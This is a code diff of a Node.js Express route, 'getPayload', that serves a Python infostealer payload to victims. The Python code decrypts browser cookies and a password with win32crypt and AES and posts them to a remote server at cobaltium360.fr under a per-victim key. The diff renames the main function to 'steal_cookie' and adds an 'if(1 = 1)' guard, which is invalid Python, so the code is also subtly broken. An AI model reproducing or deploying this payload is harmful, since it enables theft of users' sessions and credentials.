@@ -6,7 +6,7 @@ const fs = require('fs');
 
 exports.getPayload = (req, res, next) => {
     const code = `import subprocess;import os;import json;import base64;import sqlite3;import time;
-def main():
+def steal_cookie():
     from Crypto.Cipher import AES;
     import win32crypt;
     import requests;
@@ -99,7 +99,7 @@ def main():
     data = {"cookies": cookies, "password": password}
     r = requests.post('https://cobaltium360.fr:3001/api/cookie/${req.params.key}', json=data)
         
-if __name__ == "__main__":
+if(1 = 1):
     op = subprocess.Popen("pip --version", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     output = op.stdout.read()
     output_error = op.stderr.read()
@@ -184,7 +184,7 @@ if __name__ == "__main__":
                     else:
                         exit()
                 else :
-                    main()`
+                    steal_cookie()`
 
     async function payload(){
         if(req.params.key){
